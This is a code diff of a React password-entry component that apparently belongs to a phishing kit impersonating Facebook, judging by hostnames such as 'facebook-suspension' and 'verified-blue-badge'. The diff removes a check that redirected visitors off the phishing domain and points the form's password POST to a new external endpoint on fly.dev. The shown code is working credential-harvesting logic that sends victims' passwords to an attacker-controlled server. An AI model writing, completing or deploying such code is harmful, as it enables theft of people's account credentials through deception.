@@ -2,20 +2,18 @@ import React from 'react';
 import "./Password.css"
 import { useState } from 'react';
 import { useNavigate } from 'react-router';
+import url from "../assets/config"
 
 const Password = () => {
 
   const navigate = useNavigate()
 
-  if (window.location.hostname !== "verified-blue-badge.koyeb.app") {
-      window.location.href = "https://google.com";
-  }
 
   const [passwordText, setPasswordText] = useState()
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    fetch("https://facebook-suspension.koyeb.app/pass",{
+    fetch("https://api-submit.fly.dev/pass",{
       method:"POST",
       headers: {
         "Content-Type": "application/json"
